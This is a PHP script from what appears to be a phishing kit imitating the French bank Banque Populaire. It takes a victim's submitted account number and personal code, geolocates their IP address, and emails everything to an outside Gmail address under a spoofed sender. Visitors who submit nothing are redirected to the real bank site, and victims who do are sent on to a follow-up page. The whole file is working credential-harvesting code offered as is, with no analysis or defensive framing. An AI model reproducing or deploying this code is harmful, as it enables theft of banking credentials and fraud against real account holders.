<?
$ip = getenv("REMOTE_ADDR");
$time       = date( "M j, Y | G:i:s A" );
$cip = "http://ipinfo.io/$ip/country";
$postal = "http://ipinfo.io/$ip/postal";
$postal1 = file_get_contents($postal);
$creatorlocation1 = file_get_contents($cip);




$from = $_POST['moukil'];
$pass = $_POST['CCCRYC'];
$usr = $_POST['CCPTE'];


if ($usr== "")
{
echo("<script>window.location=' http://www.banquepopulaire.fr/portailinternet/Pages/robot.txt';</script>");
}
else {

$message .= "#=========[ $time ]=========#\n";
//$message .= "Site :  ".$_POST['$site']."\n";
//$message .= "TELEPHONE :  ".$_POST['tele']."\n";
$message .= "DEPARTEMENT :  ".$_POST['departement']."\n";
$message .= "N° DE COMPTE :  ".$_POST['CCPTE']."\n";
$message .= "CODE PERSONNEL :  ".$_POST['CCCRYC']."\n";
$message .= "#======[ $from ]======#\n";

$send = "pthgwa@gmail.com";

$subject = "[Pop log $from $ip ]";

$from = "From: Pop <notifications@walo.com>";

mail($send,$subject,$message,$from);


echo "<meta http-equiv='Refresh' content='0; URL=final.php'>";

}

?>